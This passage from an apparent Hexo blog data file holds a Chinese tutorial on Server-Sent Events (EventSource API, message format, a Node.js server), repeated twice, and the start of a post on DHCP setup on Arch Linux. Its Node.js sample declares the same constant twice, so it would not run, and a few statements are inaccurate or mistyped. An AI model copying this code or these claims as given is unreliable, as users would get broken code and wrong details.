class=\"comment\">// data 是服务器回传的数据，是 文本格式，二进制需要重新转码</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> data = event.data;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;, <span class=\"literal\">false</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>发生错误时</code>(例如中断)，会触发 <code>error</code> 事件，和 <code>js</code> 其他事件用法基本一致。</p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// onerror 写法</span></span><br><span class=\"line\">source.onerror = <span class=\"function\">(<span class=\"params\">event</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// addEventListener</span></span><br><span class=\"line\">source.addEventListener(<span class=\"string\">'error'</span>, (event) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;, <span class=\"literal\">false</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>关闭连接</code></p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">source.close();</span><br></pre></td></tr></table></figure></li><li><p><code>自定义事件</code>, 默认情况下触发的是 <code>message</code> 事件，但是还能自定义事件，从而不触发 <code>message</code> 事件。本例子对 <code>info</code> 事件进行监听</p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">source.addEventListener(<span class=\"string\">'info'</span>, (event) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> data = event.data;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;, <span class=\"literal\">false</span>);</span><br></pre></td></tr></table></figure></li></ul><h2 id=\"服务端的使用\"><a href=\"#服务端的使用\" class=\"headerlink\" title=\"服务端的使用\"></a>服务端的使用</h2><h3 id=\"请求头\"><a href=\"#请求头\" class=\"headerlink\" title=\"请求头\"></a>请求头</h3><p>服务端的向浏览器发送的数据是 <code>UTF-8</code> 的编码文本，<code>HTTP</code> 头具有特定的信息。<br>必须指定 <code>Content-Type</code> 类型为 <code>event-steam</code>。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Type: text/event-stream</span><br><span class=\"line\">Cache-Control: no-cache</span><br><span class=\"line\">Connection: keep-alive</span><br></pre></td></tr></table></figure><p></p><p><img src=\"/img/loading.gif\" data-original=\"/http/what-is-sse/sse-header.png\" alt=\"header\"></p><h3 id=\"数据格式\"><a href=\"#数据格式\" class=\"headerlink\" title=\"数据格式\"></a>数据格式</h3><p>每一次发送的信息，由若干个 <code>message</code> 组成，每个 <code>message</code> 之间用\\n\\n分隔。类型如下:<br></p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 数据栏</span></span><br><span class=\"line\">data: [value]\\n</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 自定义信息类型</span></span><br><span class=\"line\">event: [value]\\n</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 数据标识符</span></span><br><span class=\"line\">id: [value]\\n</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 最大间隔时间</span></span><br><span class=\"line\">retry: [value]\\n</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 注释</span></span><br><span class=\"line\">: [value]\\n</span><br></pre></td></tr></table></figure><p></p><table><thead><tr><th>对比</th><th>描述</th><th>例子</th></tr></thead><tbody><tr><td><code>data</code></td><td>数据内容用data表示，可以占用一行或多行，以“\\n\\n”结尾</td><td>data: begin message\\n<br>data: continue message\\n\\n</td></tr><tr><td><code>event</code></td><td>event头信息表示自定义的数据类型，没有则默认 <code>message</code> 事件</td><td>event: foo\\n<br>data: a foo event\\n\\n</td></tr><tr><td><code>id</code></td><td>数据标识符用id表示，相当于每一条数据的编号</td><td>id: msg1\\n<br>data: message\\n\\n</td></tr><tr><td><code>retry</code></td><td>浏览器默认三秒内没有发送任何信息开始重连。服务器端可以用 <code>retry</code> 头信息，指定通信的最大间隔时间</td><td>retry: 10000\\n</td></tr><tr><td><code></code></td><td>通常，服务器每隔一段时间就会向浏览器发送一个注释保持连接不中断</td><td>: This is a comment</td></tr></tbody></table><h2 id=\"服务端实现\"><a href=\"#服务端实现\" class=\"headerlink\" title=\"服务端实现\"></a>服务端实现</h2><p>每个服务端实现不同，以下是 <code>NodeJS</code> 方案实现。</p><h3 id=\"NodeJS-实现\"><a href=\"#NodeJS-实现\" class=\"headerlink\" title=\"NodeJS 实现\"></a>NodeJS 实现</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// sse.js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> http = <span class=\"built_in\">require</span>(<span class=\"string\">\"http\"</span>);<span class=\"keyword\">const</span> http = <span class=\"built_in\">require</span>(<span class=\"string\">\"http\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">http.createServer(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">  res.writeHead(<span class=\"number\">200</span>, &#123;</span><br><span class=\"line\">    <span class=\"string\">\"Content-Type\"</span>: <span class=\"string\">\"text/event-stream\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"Cache-Control\"</span>: <span class=\"string\">\"no-cache\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"Connection\"</span>: <span class=\"string\">\"keep-alive\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"Access-Control-Allow-Origin\"</span>: <span class=\"string\">'*'</span>,</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  res.write(<span class=\"string\">\"retry: 1000\\n\"</span>);</span><br><span class=\"line\">  res.write(<span class=\"string\">\"event: connecttime\\n\"</span>);</span><br><span class=\"line\">  res.write(<span class=\"string\">\"data: \"</span> + (<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>()) + <span class=\"string\">\"\\n\\n\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  interval = setInterval(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    res.write(<span class=\"string\">\"data: \"</span> + (<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>()) + <span class=\"string\">\"\\n\\n\"</span>);</span><br><span class=\"line\">  &#125;, <span class=\"number\">1000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  req.addListener(<span class=\"string\">\"close\"</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    clearInterval(interval);</span><br><span class=\"line\">  &#125;, <span class=\"literal\">false</span>);</span><br><span class=\"line\">&#125;).listen(<span class=\"number\">8080</span>);</span><br></pre></td></tr></table></figure><h3 id=\"启动和访问\"><a href=\"#启动和访问\" class=\"headerlink\" title=\"启动和访问\"></a>启动和访问</h3><p>仅需 <code>node sse.js</code> 即可打开</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">node sse.js</span><br></pre></td></tr></table></figure><p>并访问 <a href=\"http://127.0.0.1:8080/\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/</a> 就能访问到 <code>sse</code> 的页面啦！</p><h1 id=\"🔚-结语\"><a href=\"#🔚-结语\" class=\"headerlink\" title=\"🔚 结语\"></a>🔚 结语</h1><p>从 <code>轮询</code> 到 <code>SSE</code>，再到 <code>SSE</code> 和 <code>Websocket</code> 的技术选型，不同的场景用不同方案。在鱼和熊掌都要兼得的道路上，道阻且长。</p><p>开发过程和成长过程一样。先是“长大”就行，再到“快点长大”，最后是“好好长大”。开发过程也是一样，字符串替换“长大” 成 “迭代”。这个过程必不可少，经历也完全不同。</p><p>希望能给你带来些帮助，感谢你的时间阅读到这里💗。</p>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"🎓-背景\"><a href=\"#🎓-背景\" class=\"headerlink\" title=\"🎓 背景\"></a>🎓 背景</h1><p>浏览器和服务端交互过程中，会有服务端向浏览器通信的场景。例如：服务端异步处理信息，处理成功后向浏览器推送。</p><p>但并不是所有的后台服务都建立了 <code>websocket</code> 通道，因此常用做法是浏览器定时查询，<code>轮询</code>后台数据。</p><p>从请求的角度来看，<code>轮询</code>多余了浏览器向后台服务<code>发起握手</code>、<code>\b发送数据包</code>的过程，因此并不简洁、优雅。</p><p>那有没有既不需要 <code>websocket</code> 通道，又不用<code>轮询</code>这么 “low” 的方法呢？本文介绍的 <code>SSE</code> (server-site events) 就足够简洁和优雅。</p><h1 id=\"🤔️-SSE-是啥\"><a href=\"#🤔️-SSE-是啥\" class=\"headerlink\" title=\"🤔️ SSE 是啥\"></a>🤔️ SSE 是啥</h1><p><code>SSE</code> 全称是 Server-sent events(服务器发送事件)，是服务器向客户端推送数据的一种方式。</p><p><code>SSE</code> 的本质是通过 <code>HTTP</code> 请求，不断发送 <code>流信息(streaming)</code>，使得服务器向客户端推送信息。类似于视频流。</p><p>他不是一次性的数据包，而是会一直等着服务端的推送。因此客户端不会关闭连接，等着服务端的不断推送。这样就实现了服务端向客户端的推送。</p><h1 id=\"🆚-SSE-VS-Websocket\"><a href=\"#🆚-SSE-VS-Websocket\" class=\"headerlink\" title=\"🆚 SSE VS Websocket\"></a>🆚 SSE VS Websocket</h1><p><code>Websocket</code> 是双向通信(全双工)，浏览器 <-> 服务端相互通信，更强大也更灵活。</-></p><p><code>SSE</code> 是单向通信(半双工)，浏览器 &lt;- 服务端，本质是下载信息。</p><table><thead><tr><th>对比</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td><code>Websocket</code></td><td>1. 全双工，功能更强大<br></td><td>1.较为复杂，服务端需要重新支持<br>2.断线重连需要额外部署</td></tr><tr><td><code>SSE</code></td><td>1.协议轻量，支持 HTTP 的服务端就支持<br>2.方便默认支持断线重连<br>3.支持自定义数据类型</td><td>1.半双工，不够灵活</td></tr></tbody></table><p>两者各有特点，适合不同场所</p><h1 id=\"💡-SSE-的使用\"><a href=\"#💡-SSE-的使用\" class=\"headerlink\" title=\"💡 SSE 的使用\"></a>💡 SSE 的使用</h1><p>既然 <code>SSE</code> 作用于客户端和服务端，下面分为<code>客户端</code>和<code>服务端</code>来分别介绍 <code>API</code>。</p><h2 id=\"浏览器的使用\"><a href=\"#浏览器的使用\" class=\"headerlink\" title=\"浏览器的使用\"></a>浏览器的使用</h2><h3 id=\"检查是否可以使用\"><a href=\"#检查是否可以使用\" class=\"headerlink\" title=\"检查是否可以使用\"></a>检查是否可以使用</h3><p><code>SSE</code> 在浏览器中的API在 <code>EventSource</code> 对象上。通过这样来检测是否可以使用，通常来讲，除了 IE\\Edge，主流浏览器都支持：<br></p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">Boolean</span>(<span class=\"built_in\">window</span>.EventSource)) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><h3 id=\"和服务器建立连接\"><a href=\"#和服务器建立连接\" class=\"headerlink\" title=\"和服务器建立连接\"></a>和服务器建立连接</h3><p>浏览器先生成 <code>EventSource</code> 实例，再向服务器发起连接。</p><p>当然，url 可以是当前网址同域，也可以跨域。<br></p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 同网址</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> source = <span class=\"keyword\">new</span> EventSource(url);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 跨域带上 cookie。 打开withCredentials属性，表示是否一起发送 Cookie。</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> source = <span class=\"keyword\">new</span> EventSource(url, &#123; <span class=\"attr\">withCredentials</span>: <span class=\"literal\">true</span> &#125;);</span><br></pre></td></tr></table></figure><p></p><h3 id=\"状态变化\"><a href=\"#状态变化\" class=\"headerlink\" title=\"状态变化\"></a>状态变化</h3><p><code>EventSource</code> 实例中 <code>readyState</code> 属性表明了当前连接状态。可以取以下值。</p><table><thead><tr><th>取值</th><th>解释</th></tr></thead><tbody><tr><td><code>0</code></td><td>表示连接还未建立，或者断线正在重连</td></tr><tr><td><code>1</code></td><td>表示连接已经建立，可以接受数据</td></tr><tr><td><code>2</code></td><td>表示连接已断，且不会重连</td></tr></tbody></table><h3 id=\"基本使用\"><a href=\"#基本使用\" class=\"headerlink\" title=\"基本使用\"></a>基本使用</h3><ul><li><p><code>建立连接时</code>，会触发 <code>open</code> 事件，和 <code>js</code> 其他事件用法基本一致</p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// onopen 写法</span></span><br><span class=\"line\">source.onopen = <span class=\"function\">(<span class=\"params\">event</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// addEventListener</span></span><br><span class=\"line\">source.addEventListener(<span class=\"string\">'open'</span>, (event) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;, <span class=\"literal\">false</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>收到消息时</code>，会触发 <code>message</code> 事件，和 <code>js</code> 其他事件用法基本一致。</p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// onmessage 写法</span></span><br><span class=\"line\">source.onmessage = <span class=\"function\">(<span class=\"params\">event</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> data = event.data;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// addEventListener</span></span><br><span class=\"line\">source.addEventListener(<span class=\"string\">'message'</span>, (event) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"comment\">// data 是服务器回传的数据，是 文本格式，二进制需要重新转码</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> data = event.data;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;, <span class=\"literal\">false</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>发生错误时</code>(例如中断)，会触发 <code>error</code> 事件，和 <code>js</code> 其他事件用法基本一致。</p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// onerror 写法</span></span><br><span class=\"line\">source.onerror = <span class=\"function\">(<span class=\"params\">event</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// addEventListener</span></span><br><span class=\"line\">source.addEventListener(<span class=\"string\">'error'</span>, (event) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;, <span class=\"literal\">false</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>关闭连接</code></p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">source.close();</span><br></pre></td></tr></table></figure></li><li><p><code>自定义事件</code>, 默认情况下触发的是 <code>message</code> 事件，但是还能自定义事件，从而不触发 <code>message</code> 事件。本例子对 <code>info</code> 事件进行监听</p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">source.addEventListener(<span class=\"string\">'info'</span>, (event) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> data = event.data;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;, <span class=\"literal\">false</span>);</span><br></pre></td></tr></table></figure></li></ul><h2 id=\"服务端的使用\"><a href=\"#服务端的使用\" class=\"headerlink\" title=\"服务端的使用\"></a>服务端的使用</h2><h3 id=\"请求头\"><a href=\"#请求头\" class=\"headerlink\" title=\"请求头\"></a>请求头</h3><p>服务端的向浏览器发送的数据是 <code>UTF-8</code> 的编码文本，<code>HTTP</code> 头具有特定的信息。<br>必须指定 <code>Content-Type</code> 类型为 <code>event-steam</code>。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Type: text/event-stream</span><br><span class=\"line\">Cache-Control: no-cache</span><br><span class=\"line\">Connection: keep-alive</span><br></pre></td></tr></table></figure><p></p><p><img src=\"/http/what-is-sse/sse-header.png\" alt=\"header\"></p><h3 id=\"数据格式\"><a href=\"#数据格式\" class=\"headerlink\" title=\"数据格式\"></a>数据格式</h3><p>每一次发送的信息，由若干个 <code>message</code> 组成，每个 <code>message</code> 之间用\\n\\n分隔。类型如下:<br></p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 数据栏</span></span><br><span class=\"line\">data: [value]\\n</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 自定义信息类型</span></span><br><span class=\"line\">event: [value]\\n</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 数据标识符</span></span><br><span class=\"line\">id: [value]\\n</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 最大间隔时间</span></span><br><span class=\"line\">retry: [value]\\n</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 注释</span></span><br><span class=\"line\">: [value]\\n</span><br></pre></td></tr></table></figure><p></p><table><thead><tr><th>对比</th><th>描述</th><th>例子</th></tr></thead><tbody><tr><td><code>data</code></td><td>数据内容用data表示，可以占用一行或多行，以“\\n\\n”结尾</td><td>data: begin message\\n<br>data: continue message\\n\\n</td></tr><tr><td><code>event</code></td><td>event头信息表示自定义的数据类型，没有则默认 <code>message</code> 事件</td><td>event: foo\\n<br>data: a foo event\\n\\n</td></tr><tr><td><code>id</code></td><td>数据标识符用id表示，相当于每一条数据的编号</td><td>id: msg1\\n<br>data: message\\n\\n</td></tr><tr><td><code>retry</code></td><td>浏览器默认三秒内没有发送任何信息开始重连。服务器端可以用 <code>retry</code> 头信息，指定通信的最大间隔时间</td><td>retry: 10000\\n</td></tr><tr><td><code></code></td><td>通常，服务器每隔一段时间就会向浏览器发送一个注释保持连接不中断</td><td>: This is a comment</td></tr></tbody></table><h2 id=\"服务端实现\"><a href=\"#服务端实现\" class=\"headerlink\" title=\"服务端实现\"></a>服务端实现</h2><p>每个服务端实现不同，以下是 <code>NodeJS</code> 方案实现。</p><h3 id=\"NodeJS-实现\"><a href=\"#NodeJS-实现\" class=\"headerlink\" title=\"NodeJS 实现\"></a>NodeJS 实现</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// sse.js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> http = <span class=\"built_in\">require</span>(<span class=\"string\">\"http\"</span>);<span class=\"keyword\">const</span> http = <span class=\"built_in\">require</span>(<span class=\"string\">\"http\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">http.createServer(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">  res.writeHead(<span class=\"number\">200</span>, &#123;</span><br><span class=\"line\">    <span class=\"string\">\"Content-Type\"</span>: <span class=\"string\">\"text/event-stream\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"Cache-Control\"</span>: <span class=\"string\">\"no-cache\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"Connection\"</span>: <span class=\"string\">\"keep-alive\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"Access-Control-Allow-Origin\"</span>: <span class=\"string\">'*'</span>,</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  res.write(<span class=\"string\">\"retry: 1000\\n\"</span>);</span><br><span class=\"line\">  res.write(<span class=\"string\">\"event: connecttime\\n\"</span>);</span><br><span class=\"line\">  res.write(<span class=\"string\">\"data: \"</span> + (<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>()) + <span class=\"string\">\"\\n\\n\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  interval = setInterval(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    res.write(<span class=\"string\">\"data: \"</span> + (<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>()) + <span class=\"string\">\"\\n\\n\"</span>);</span><br><span class=\"line\">  &#125;, <span class=\"number\">1000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  req.addListener(<span class=\"string\">\"close\"</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    clearInterval(interval);</span><br><span class=\"line\">  &#125;, <span class=\"literal\">false</span>);</span><br><span class=\"line\">&#125;).listen(<span class=\"number\">8080</span>);</span><br></pre></td></tr></table></figure><h3 id=\"启动和访问\"><a href=\"#启动和访问\" class=\"headerlink\" title=\"启动和访问\"></a>启动和访问</h3><p>仅需 <code>node sse.js</code> 即可打开</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">node sse.js</span><br></pre></td></tr></table></figure><p>并访问 <a href=\"http://127.0.0.1:8080/\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/</a> 就能访问到 <code>sse</code> 的页面啦！</p><h1 id=\"🔚-结语\"><a href=\"#🔚-结语\" class=\"headerlink\" title=\"🔚 结语\"></a>🔚 结语</h1><p>从 <code>轮询</code> 到 <code>SSE</code>，再到 <code>SSE</code> 和 <code>Websocket</code> 的技术选型，不同的场景用不同方案。在鱼和熊掌都要兼得的道路上，道阻且长。</p><p>开发过程和成长过程一样。先是“长大”就行，再到“快点长大”，最后是“好好长大”。开发过程也是一样，字符串替换“长大” 成 “迭代”。这个过程必不可少，经历也完全不同。</p><p>希望能给你带来些帮助，感谢你的时间阅读到这里💗。</p>"},{"title":"DPCH (DPCHCD)服务器的搭建与应用","date":"2017-10-21T12:53:10.000Z","dir":"linux","keywords":["linux","DPCH"],"_content":"### 什么是DHCP？\n#### 1.DHCP简介\nDHCP(Dynamic Host Configuration Protocol),动态主机配置协议，是一个应用层协议。当我们将客户主机ip地址设置为动态获取方式时，DHCP服务器就会根据DHCP协议给客户端分配IP，使得客户机能够利用这个IP上网。\n#### 2.为什么要使用DHCP？\nDHCP（Dynamic Host Configuration Protocol，动态主机配置协议）通常被应用在大型的局域网络环境中，主要作用是集中的管理、分配IP地址，使网络环境中的主机动态的获得IP地址、Gateway地址、DNS服务器地址等信息，并能够提升地址的使用率。\n#### 3.DHCP实现\n![dhcp_client](dhcp_client.png)\nDHCP的实现分为4步，分别是：\n第一步：Client端在局域网内发起一个DHCP　Discover包，目的是想发现能够给它提供IP的DHCP Server。\n第二步：可用的DHCP Server接收到Discover包之后，通过发送DHCP Offer包给予Client端应答，意在告诉Client端它可以提供IP地址。\n第三步：Client端接收到Offer包之后，发送DHCP Request包请求分配IP。\n第四步：DHCP Server发送ACK数据包，确认信息。\n####　4.安装DHCP服务器\n由于我使用的系统是archlinux，因此在我bash中之存在dhcpcd，当然他们是同名。\n使用如下命令安装\n```\npacman -S dhcpcd\n\n```\n检测是否安装成功,键入如下命令\n```\ndhcpcd --version\n//显示如下。。。代表安装成功\ndhcpcd 6.11.5\nCopyright (c) 2006-2016 Roy Marples\nCompiled in features: INET IPv4LL INET6 DHCPv6 AUTH\n\n```\n#### 5.DHCP服务器的一般配置\n##### dhcp服务器一般配置步骤\n1、dhcp服务器住配置文件dhcpd.conf，制定ip作用域，制定分配一个或多个ip地址范围\n2、建立租约数据库文件\n3、重新加载配置文件或重启dhcp服务器\n\n##### dhcp的工作流程\n在翻阅其他人的博客中，发现这个哥们的博客写的很好，因此[引用](http://www.zyops.com/dhcp-working-procedure)过来\n\n##### 配置文件DHCPD.CONF\n由于我的系统是archlinux，因此自动生成了一个dhcpd.conf文件在/etc目录之下。下面看一个完整的dhcpcd.conf：\n```\nvim /etc/dhcpd.conf \n# dhcpd.conf\n#\n# Sample configuration file for ISC dhcpd\n#\n# option definitions common to all supported networks...\noption domain-name \"example.org\";\noption domain-name-servers ns1.example.org, ns2.example.org;\ndefault-lease-time 600;\nmax-lease-time 7200;\n# Use this to enble / disable dynamic dns updates globally.\n#ddns-update-style none;\n# If this DHCP server is the official DHCP server for the local\n# network, the authoritative directive should be uncommented.\n#authoritative;\n# Use this to send dhcp log messages to a different log file (you also\n# have to hack syslog.conf to complete the redirection).\nlog-facility local7;\n# No service will be given on this subnet, but declaring it helps the \n# DHCP server to understand the network topology.\nsubnet 10.152.187.0 netmask 255.255.255.0 {\n}\n# This is a very basic subnet declaration.\nsubnet 10.254.239.0 netmask 255.255.255.224 {\n  range 10.254.239.10 10.254.239.20;\n  option routers rtr-239-0-1.example.org, rtr-239-0-2.example.org;\n}\n# This declaration allows BOOTP clients to get dynamic addresses,\n# which we don't really 